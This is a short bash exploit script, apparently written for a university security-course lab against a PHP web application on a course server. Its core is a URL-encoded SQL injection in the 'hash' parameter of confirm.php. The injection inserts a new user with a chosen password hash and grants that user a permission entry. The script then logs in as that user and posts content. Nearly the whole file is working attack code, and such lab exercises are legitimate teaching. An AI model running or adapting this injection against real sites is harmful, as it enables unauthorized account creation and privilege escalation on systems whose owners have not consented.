#!/bin/bash
curl "http://ugster21.student.cs.uwaterloo.ca/reset/z63zhu"
curl "http://ugster21.student.cs.uwaterloo.ca/z63zhu/docs/website_db.db" > data.db
POST_URL="${1}/post.php"
curl "${1}/confirm.php?hash=cafebabe%27%3B+INSERT+INTO+users%28username%2Cpassword%2Cconfirm%2Cactive%29+VALUES+%28%27z63zhu%27%2C%27aea9a50b7a31b77faf2efb149016d4d38b260979%27%2C%27%27%2C1%29%3B+INSERT+INTO+ref+%28id_perm%2Cid_user%29+VALUES+%281%2C10%29--+"
curl -c cookies -d "username=z63zhu&password=Passsw0rd&form=login&submit=Login" ${POST_URL}
curl -b cookies -d "title=zzzz&content=zzzzzzzzz&type=1&form=content&submit=submit" ${POST_URL}
